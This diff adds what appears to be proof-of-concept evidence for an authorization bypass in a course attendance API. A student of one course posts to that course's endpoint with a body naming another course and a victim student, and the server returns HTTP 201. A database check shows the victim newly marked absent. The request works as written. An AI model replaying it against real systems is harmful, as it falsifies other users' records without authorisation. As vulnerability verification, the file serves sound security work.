@@ -1,0 +1,10 @@
+attacker is a STUDENT of course A=e03d8e42-24b7-47fe-b4b3-63b49649a9d1 only (not a member of course B)
+POST /course/e03d8e42-24b7-47fe-b4b3-63b49649a9d1/attendance  (path course A)
+body = {'courseId': '45a482df-6b3d-4e68-b85b-a383c3627abf', 'lessonId': 'ef58e841-7169-49f7-bd67-4a9ea5a6dce1', 'studentId': 'ae0cc735-421c-4cb3-9250-351adc53d452', 'isPresent': False}   (body targets course B + victim groupmember ae0cc735-421c-4cb3-9250-351adc53d452)
+
+HTTP 201
+{"success":true,"data":{"id":4,"createdAt":"2026-09-27 14:49:49.685227+00","updatedAt":"2026-09-27 14:49:49.685227+00","courseId":"45a482df-6b3d-4e68-b85b-a383c3627abf","studentId":"ae0cc735-421c-4cb3-9250-351adc53d452","isPresent":false,"lessonId":"ef58e841-7169-49f7-bd67-4a9ea5a6dce1"}}
+
+psql group_attendance (course_id=B, student_id=victim gm, lesson_id=L):
+  before rows = 0
+  after  row  = '4|f'
